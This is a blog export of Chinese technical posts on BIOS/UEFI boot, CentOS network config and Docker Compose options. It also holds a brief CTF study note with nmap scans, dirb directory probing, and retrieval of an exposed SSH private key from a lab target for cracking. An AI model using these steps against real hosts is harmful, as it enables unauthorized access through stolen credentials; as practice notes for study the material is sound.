<p>  硬件初始化工作主要有两点，首先POST检测后，电脑出现了开机启动画面，这就是已经检测到了显卡并完成了初始化，但由于BIOS是在16位实模式运行，因此画面是以VGA分辨率（640*480，纵横比4:3）显示的。第二，BIOS只识别到由主引导记录（MBR）初始化的硬盘，而EFI或UEFI采用了一种新的GUID磁盘分区系统（GPT）格式，这种硬盘在BIOS下是无法识别的。硬件全部初始化完毕后进入更新ESCD阶段。</p>
<p>  在ESCD更新阶段中，BIOS将对存储在CMOS中和操作系统交换的硬件配置数据进行检测，如果系统硬件发生变动，则会更新该数据，否则不更新保持原状不变，ESCD检测或更新结束后，BIOS将完成最后一项工作，就是启动操作系统。</p>
<p>  最后这一步中，BIOS根据CMOS中用户指定的硬件启动顺序，读取相应设备的启动或引导记录，引导相应设备上的操作系统启动，进入操作系统，此后便由操作系统接替BIOS负责硬件和软件间的相互通信。如果发现所有硬件都没有能引导操作系统的记录，则会在屏幕上显示相应错误信息，并将电脑维持在16位实模式。</p>
<h2 id="UEFI启动计算机的过程"><a href="#UEFI启动计算机的过程" class="headerlink" title="UEFI启动计算机的过程"></a><span id="uefi">UEFI启动计算机的过程</span></h2><p>打开电源开关时，电脑的主要部件都开始有了供电，与BIOS不同的是，UEFI预加载环境首先开始执行，负责CPU和内存（全部容量）的初始化工作，这里如出现重要问题，电脑即使有报警喇叭也不会响，因为UEFI没有去驱动8255发声，不过预加载环境只检查CPU和内存，如果这两个主要硬件出问题，屏幕没显示可以立即确定，另外一些主板会有提供LED提示，可根据CPU或内存亮灯大致判断故障。</p>
<p>CPU和内存初始化成功后，DXE（Driver eXecution Environment，驱动程序执行环境）载入，当DXE载入后，UEFI就具有了枚举并加载UEFI驱动程序的能力，在此阶段，UEFI会枚举搜索各个硬件的UEFI驱动并相继加载，完成硬件初始化工作，这相比BIOS的读中断加载速度会快的多，同样如加载显卡的UEFI驱动成功，电脑也会出现启动画面，硬件驱动全部加载完毕后，最后同BIOS一样，也得去启动操作系统。</p>
<p>在启动操作系统的阶段，同样是根据启动记录的启动顺序，转到相应设备（仅限GPT设备，如果启动传统MBR设备，则需要打开CSM支持）的引导记录，引导操作系统并进入，注意，UEFI在检测到无任何操作系统启动设备时，会直接进入UEFI设置页面，而不是像BIOS那样黑屏显示相关信息。</p>
<h2 id="概括："><a href="#概括：" class="headerlink" title="概括："></a>概括：</h2><ul>
<li><p>BIOS先要对CPU初始化，然后跳转到BIOS启动处进行POST自检，此过程如有严重错误，则电脑会用不同的报警声音提醒，接下来采用读中断的方式加载各种硬件，完成硬件初始化后进入操作系统启动过程</p>
</li>
<li><p>而UEFI则是运行预加载环境先直接初始化CPU和内存，CPU和内存若有问题则直接黑屏，其后启动PXE采用枚举方式搜索各种硬件并加载驱动，完成硬件初始化，之后同样进入操作系统启动过程</p>
</li>
</ul>
<h1 id="参考，扩展"><a href="#参考，扩展" class="headerlink" title="参考，扩展"></a>参考，扩展</h1><p><a href="https://zhuanlan.zhihu.com/p/54108702">电脑基础知识普及：BIOS、EFI与UEFI详解</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/31365115">科普贴：BIOS和UEFI的启动项</a></p>
<p><a href="https://www.tony-yin.site/2019/01/10/Talk_BIOS_UEFI_MBR_GPT_GRUB/#GRUB%E4%BD%8D%E7%BD%AE">聊聊 BIOS、UEFI、MBR、GPT、GRUB…… </a></p>
<p><a href="https://en.wikipedia.org/wiki/Partition_table">分区表</a></p>
]]></content>
      <tags>
        <tag>BIOS</tag>
        <tag>UEFI</tag>
        <tag>MBR</tag>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习笔记</title>
    <url>/posts/586ba39a/</url>
    <content><![CDATA[<h1 id="CTF-学习笔记"><a href="#CTF-学习笔记" class="headerlink" title="CTF 学习笔记"></a>CTF 学习笔记</h1><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24		<span class="comment">#扫描网段存活IP</span></span><br><span class="line">nmap -sV 192.168.0.0/24		<span class="comment">#扫描存活端口</span></span><br><span class="line"><span class="comment">#通过开放的可疑端口（将服务运行在非常规的端口上）访问，查看源代码看是否有有用信息</span></span><br><span class="line"></span><br><span class="line">dirb http://192.168.0.7:31337	<span class="comment">#探测隐藏文件</span></span><br><span class="line"><span class="comment">#探测出相关影藏文件后对可疑文件进行分析</span></span><br><span class="line"><span class="comment">#robots文件	记录禁止被探测的文件，通过该文件内容能找到一些重要文件</span></span><br><span class="line"><span class="comment">#.ssh文件		记录ssh秘钥信息，通常id_rsd代表私钥（可用来认证ssh登录），authorized_keys代表认证信息(能从中找用户名等信息))，id_rsa.pub代表公钥</span></span><br><span class="line"><span class="comment">#ssh是一钟远程加密登录协议，通常是用于远程管理计算机使用，ssh可通过口令登录，也可通过秘钥登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过.ssh文件猜猜存在秘钥文件</span></span><br><span class="line"><span class="comment">#获得秘钥文件</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/authorized_keys</span></span><br><span class="line"><span class="comment">#给私钥修改权限</span></span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"><span class="comment">#破解私钥信息</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息安全</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS无网卡配置文件解决方法</title>
    <url>/posts/13f6370e/</url>
    <content><![CDATA[<h1 id="网卡UUID"><a href="#网卡UUID" class="headerlink" title="网卡UUID"></a>网卡UUID</h1><p>查看相应网卡的UUID并记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con show</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h1><p>查询MAC地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><h2 id="复制配置文件"><a href="#复制配置文件" class="headerlink" title="复制配置文件"></a>复制配置文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/sysconfig/network-scripts/ifcfg-lo /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>
<h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容为,配置为dhcp方式</span></span><br><span class="line">DEVICE=eth0</span><br><span class="line">BOOTPROTO=dhcp</span><br><span class="line">ONBOOT=yes</span><br><span class="line">NAME=eth0</span><br><span class="line">HWADDR=08:00:27:87:e0:71</span><br><span class="line">UUID=5ba235cf-49ea-4648-9e65-609208bf7b64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若配置静态地址</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.56.3</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.56.1</span><br><span class="line">DNS1=114.114.114.114</span><br></pre></td></tr></table></figure>
<h1 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-Compose模板文件</title>
    <url>/posts/6c72393/</url>
    <content><![CDATA[<h1 id="Docker-Compose-模板文件"><a href="#Docker-Compose-模板文件" class="headerlink" title="Docker Compose 模板文件"></a>Docker Compose 模板文件</h1><p>模板文件是使用 <code>Compose</code> 的核心，涉及到的指令关键字也比较多。但大家不用担心，这里面大部分指令跟 <code>docker run</code> 相关参数的含义都是类似的。</p>
<p>默认的模板文件名称为 <code>docker-compose.yml</code>，格式为 YAML 格式。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">examples/web</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/data&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>注意每个服务都必须通过 <code>image</code> 指令指定镜像或 <code>build</code> 指令（需要 Dockerfile）等来自动构建生成镜像。</p>
<p>如果使用 <code>build</code> 指令，在 <code>Dockerfile</code> 中设置的选项(例如：<code>CMD</code>, <code>EXPOSE</code>, <code>VOLUME</code>, <code>ENV</code> 等) 将会自动被获取，无需在 <code>docker-compose.yml</code> 中再次设置。</p>
<p>下面分别介绍各个指令的用法。</p>
<h2 id="build"><a href="#build" class="headerlink" title="build"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#build"><code>build</code></a></h2><p>指定 <code>Dockerfile</code> 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 <code>Compose</code> 将会利用它自动构建这个镜像，然后使用这个镜像。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure>
<p>你也可以使用 <code>context</code> 指令指定 <code>Dockerfile</code> 所在文件夹的路径。</p>
<p>使用 <code>dockerfile</code> 指令指定 <code>Dockerfile</code> 文件名。</p>
<p>使用 <code>arg</code> 指令指定构建镜像时的变量。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./dir</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line">      <span class="attr">args:</span></span><br><span class="line">        <span class="attr">buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>cache_from</code> 指定构建镜像的缓存</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">build:</span></span><br><span class="line">  <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">cache_from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">alpine:latest</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">corp/web_app:3.14</span></span><br></pre></td></tr></table></figure>
<h2 id="cap-add-cap-drop"><a href="#cap-add-cap-drop" class="headerlink" title="cap_add, cap_drop"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#cap-add-cap-drop"><code>cap_add, cap_drop</code></a></h2><p>指定容器的内核能力（capacity）分配。</p>
<p>例如，让容器拥有所有能力可以指定为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cap_add:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ALL</span></span><br></pre></td></tr></table></figure>
<p>去掉 <code>NET_ADMIN</code> 能力可以指定为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cap_drop:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br></pre></td></tr></table></figure>
<h2 id="command"><a href="#command" class="headerlink" title="command"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#command"><code>command</code></a></h2><p>覆盖容器启动后默认执行的命令。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="string">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="configs"><a href="#configs" class="headerlink" title="configs"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#configs"><code>configs</code></a></h2><p>仅用于 <code>Swarm mode</code></p>
<h2 id="cgroup-parent"><a href="#cgroup-parent" class="headerlink" title="cgroup_parent"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#cgroup-parent"><code>cgroup_parent</code></a></h2><p>指定父 <code>cgroup</code> 组，意味着将继承该组的资源限制。</p>
<p>例如，创建了一个 cgroup 组名称为 <code>cgroups_1</code>。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cgroup_parent:</span> <span class="string">cgroups_1</span></span><br></pre></td></tr></table></figure>
<h2 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#container-name"><code>container_name</code></a></h2><p>指定容器名称。默认将会使用 <code>项目名称_服务名称_序号</code> 这样的格式。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">container_name:</span> <span class="string">docker-web-container</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意: 指定容器名称后，该服务将无法进行扩展（scale），因为 Docker 不允许多个容器具有相同的名称。</p>
</blockquote>
<h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#deploy"><code>deploy</code></a></h2><p>仅用于 <code>Swarm mode</code></p>
<h2 id="devices"><a href="#devices" class="headerlink" title="devices"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#devices"><code>devices</code></a></h2><p>指定设备映射关系。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">devices:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;/dev/ttyUSB1:/dev/ttyUSB0&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#depends-on"><code>depends_on</code></a></h2><p>解决容器的依赖、启动先后的问题。以下例子中会先启动 <code>redis</code> <code>db</code> 再启动 <code>web</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：<code>web</code> 服务不会等待 <code>redis</code> <code>db</code> 「完全启动」之后才启动。</p>
</blockquote>
<h2 id="dns"><a href="#dns" class="headerlink" title="dns"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#dns"><code>dns</code></a></h2><p>自定义 <code>DNS</code> 服务器。可以是一个值，也可以是一个列表。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dns:</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure>
<h2 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#dns-search"><code>dns_search</code></a></h2><p>配置 <code>DNS</code> 搜索域。可以是一个值，也可以是一个列表。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dns_search:</span> <span class="string">example.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns_search:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain1.example.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain2.example.com</span></span><br></pre></td></tr></table></figure>
<h2 id="tmpfs"><a href="#tmpfs" class="headerlink" title="tmpfs"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#tmpfs"><code>tmpfs</code></a></h2><p>挂载一个 tmpfs 文件系统到容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tmpfs:</span> <span class="string">/run</span></span><br><span class="line"><span class="attr">tmpfs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/run</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure>
<h2 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#env-file"><code>env_file</code></a></h2><p>从文件中获取环境变量，可以为单独的文件路径或列表。</p>
<p>如果通过 <code>docker-compose -f FILE</code> 方式来指定 Compose 模板文件，则 <code>env_file</code> 中变量的路径会基于模板文件路径。</p>
<p>如果有变量名称与 <code>environment</code> 指令冲突，则按照惯例，以后者为准。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">env_file: .env</span><br><span class="line"></span><br><span class="line">env_file:</span><br><span class="line">  - ./common.env</span><br><span class="line">  - ./apps/web.env</span><br><span class="line">  - /opt/secrets.env</span><br></pre></td></tr></table></figure>
<p>环境变量文件中每一行必须符合格式，支持 <code>#</code> 开头的注释行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># common.env: Set development environment</span></span><br><span class="line">PROG_ENV=development</span><br></pre></td></tr></table></figure>
<h2 id="environment"><a href="#environment" class="headerlink" title="environment"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#environment"><code>environment</code></a></h2><p>设置环境变量。你可以使用数组或字典两种格式。</p>
<p>只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="attr">RACK_ENV:</span> <span class="string">development</span></span><br><span class="line">  <span class="attr">SESSION_SECRET:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RACK_ENV=development</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SESSION_SECRET</span></span><br></pre></td></tr></table></figure>
<p>如果变量名称或者值中用到 <code>true|false，yes|no</code> 等表达 <a href="http://yaml.org/type/bool.html">布尔</a> 含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y|Y|yes|Yes|YES|n|N|no|No|NO|<span class="literal">true</span>|True|TRUE|<span class="literal">false</span>|False|FALSE|on|On|ON|off|Off|OFF</span><br></pre></td></tr></table></figure>
<h2 id="expose"><a href="#expose" class="headerlink" title="expose"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#expose"><code>expose</code></a></h2><p>暴露端口，但不映射到宿主机，只被连接的服务访问。</p>
<p>仅可以指定内部端口为参数</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">expose:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;3000&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;8000&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="external-links"><a href="#external-links" class="headerlink" title="external_links"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#external-links"><code>external_links</code></a></h2><blockquote>
<p>注意：不建议使用该指令。</p>
</blockquote>
<p>链接到 <code>docker-compose.yml</code> 外部的容器，甚至并非 <code>Compose</code> 管理的外部容器。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">external_links:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">redis_1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">project_db_1:mysql</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">project_db_1:postgresql</span></span><br></pre></td></tr></table></figure>
<h2 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#extra-hosts"><code>extra_hosts</code></a></h2><p>类似 Docker 中的 <code>--add-host</code> 参数，指定额外的 host 名称映射信息。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">extra_hosts:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;googledns:8.8.8.8&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;dockerhub:52.1.157.61&quot;</span></span><br></pre></td></tr></table></figure>
<p>会在启动后的服务容器中 <code>/etc/hosts</code> 文件中添加如下两条条目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">8.8.8.8 googledns</span><br><span class="line">52.1.157.61 dockerhub</span><br></pre></td></tr></table></figure>
<h2 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#healthcheck"><code>healthcheck</code></a></h2><p>通过命令检查容器是否健康运行。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">healthcheck:</span></span><br><span class="line">  <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-f&quot;</span>, <span class="string">&quot;http://localhost&quot;</span>]</span><br><span class="line">  <span class="attr">interval:</span> <span class="string">1m30s</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">retries:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h2 id="image"><a href="#image" class="headerlink" title="image"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#image"><code>image</code></a></h2><p>指定为镜像名称或镜像 ID。如果镜像在本地不存在，<code>Compose</code> 将会尝试拉取这个镜像。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">ubuntu</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">orchardup/postgresql</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">a4bc65fd</span></span><br></pre></td></tr></table></figure>
<h2 id="labels"><a href="#labels" class="headerlink" title="labels"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#labels"><code>labels</code></a></h2><p>为容器添加 Docker 元数据（metadata）信息。例如可以为容器添加辅助说明信息。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="attr">com.startupteam.description:</span> <span class="string">&quot;webapp for a startup team&quot;</span></span><br><span class="line">  <span class="attr">com.startupteam.department:</span> <span class="string">&quot;devops department&quot;</span></span><br><span class="line">  <span class="attr">com.startupteam.release:</span> <span class="string">&quot;rc3 for v1.0&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="links"><a href="#links" class="headerlink" title="links"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#links"><code>links</code></a></h2><blockquote>
<p>注意：不推荐使用该指令。</p>
</blockquote>
<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#logging"><code>logging</code></a></h2><p>配置日志选项。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">driver:</span> <span class="string">syslog</span></span><br><span class="line">  <span class="attr">options:</span></span><br><span class="line">    <span class="attr">syslog-address:</span> <span class="string">&quot;tcp://192.168.0.42:123&quot;</span></span><br></pre></td></tr></table></figure>
<p>目前支持三种日志驱动类型。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">driver:</span> <span class="string">&quot;json-file&quot;</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">&quot;syslog&quot;</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">&quot;none&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>options</code> 配置日志驱动的相关参数。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">options:</span></span><br><span class="line">  <span class="attr">max-size:</span> <span class="string">&quot;200k&quot;</span></span><br><span class="line">  <span class="attr">max-file:</span> <span class="string">&quot;10&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="network-mode"><a href="#network-mode" class="headerlink" title="network_mode"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#network-mode"><code>network_mode</code></a></h2><p>设置网络模式。使用和 <code>docker run</code> 的 <code>--network</code> 参数一样的值。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">network_mode:</span> <span class="string">&quot;bridge&quot;</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">&quot;host&quot;</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">&quot;none&quot;</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">&quot;service:[service name]&quot;</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">&quot;container:[container name/id]&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="networks"><a href="#networks" class="headerlink" title="networks"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#networks"><code>networks</code></a></h2><p>配置容器连接的网络。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">some-service:</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">some-network</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">other-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">some-network:</span></span><br><span class="line">  <span class="attr">other-network:</span></span><br></pre></td></tr></table></figure>
<h2 id="pid"><a href="#pid" class="headerlink" title="pid"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#pid"><code>pid</code></a></h2><p>跟主机系统共享进程命名空间。打开该选项的容器之间，以及容器和宿主机系统之间可以通过进程 ID 来相互访问和操作。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pid:</span> <span class="string">&quot;host&quot;</span></span><br></pre></td></tr></table></figure>
<p>1</p>
<h2 id="ports"><a href="#ports" class="headerlink" title="ports"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#ports"><code>ports</code></a></h2><p>暴露端口信息。</p>
<p>使用宿主端口：容器端口 <code>(HOST:CONTAINER)</code> 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;3000&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;49100:22&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:8001:8001&quot;</span></span><br></pre></td></tr></table></figure>
<p><em>注意：当使用 <code>HOST:CONTAINER</code> 格式来映射端口时，如果你使用的容器端口小于 60 并且没放到引号里，可能会得到错误结果，因为 <code>YAML</code> 会自动解析 <code>xx:yy</code> 这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。</em></p>
<h2 id="secrets"><a href="#secrets" class="headerlink" title="secrets"></a><a href="https://funtl.com/zh/docs-docker/Docker-Compose-模板文件.html#secrets"><code>secrets</code></a></h2><p>存储敏感数据，例如 <code>mysql</code> 服务密码。</p>
